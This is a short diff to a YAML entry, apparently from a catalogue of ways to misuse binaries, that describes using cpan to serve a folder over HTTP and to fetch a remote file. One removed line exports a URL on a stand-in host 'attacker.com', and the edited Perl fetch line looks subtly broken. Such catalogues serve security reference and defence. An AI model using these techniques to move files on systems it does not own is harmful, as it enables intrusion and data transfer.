@@ -1,6 +1,6 @@
 ---
 functions:
-  file-upload:
+  server:
     - description: Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.
       code: |
         cpan
@@ -8,7 +8,6 @@ functions:
   file-download:
     - description: Fetch a remote file via an HTTP GET request and store it in `PWD`.
       code: |
-        export URL=http://attacker.com/file_to_get
         cpan
-        ! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
+        ! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{$URL}"))->fetch();
 ---
